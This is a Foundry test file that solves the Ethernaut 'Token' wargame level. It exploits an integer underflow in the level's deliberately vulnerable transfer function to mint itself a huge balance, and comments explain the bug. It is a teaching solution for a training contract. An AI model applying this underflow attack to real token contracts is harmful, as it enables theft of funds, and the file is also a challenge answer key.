// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/Ethernaut.sol";
import "../src/levels/05-TokenFactory.sol";

contract TokenHackTest is Test {
    Ethernaut ethernaut;
    address attacker1 = address(1337);
    address attacker2 = address(1338);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker1, 1 wei);
        vm.deal(attacker2, 1 wei);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TokenFactory factory = new TokenFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker2);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Token tokenContract = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // The bug in the contract here is in the `transfer` function
        // where uint256 would always be >= 0,
        // and the operation would wrap in case of over/underflow
        // thus the require would never failed
        // NOTE: This attack is not possible anymore if the contract code
        // is compiled with solidity ^0.8.0
        assertEq(tokenContract.balanceOf(attacker2), 20 wei);
        tokenContract.transfer(attacker1, 20000000);
        assertEq(tokenContract.balanceOf(attacker1), 20000000);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
